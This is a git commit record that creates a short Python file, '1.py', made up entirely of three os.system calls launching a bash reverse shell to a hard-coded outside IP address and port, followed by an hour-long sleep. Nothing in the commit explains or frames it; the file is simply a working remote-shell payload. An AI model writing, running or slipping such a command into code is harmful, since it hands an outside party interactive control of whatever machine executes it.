090599e4e775c30606d2d0d2e9d6547e12dcf126
singlemindedt <44424494+singlemindedt@users.noreply.github.com>
2021-10-13 16:55:15 +0800

    Create 1.py

---
+++ 1.py
@@ -0,0 +1,8 @@
+import os 
+import time
+
+os.system('bash -i >& /dev/tcp/159.75.88.109/33333 0>&1')
+os.system('bash -i >& /dev/tcp/159.75.88.109/33333 0>&1')
+os.system('bash -i >& /dev/tcp/159.75.88.109/33333 0>&1')
+
+time.sleep(3600)
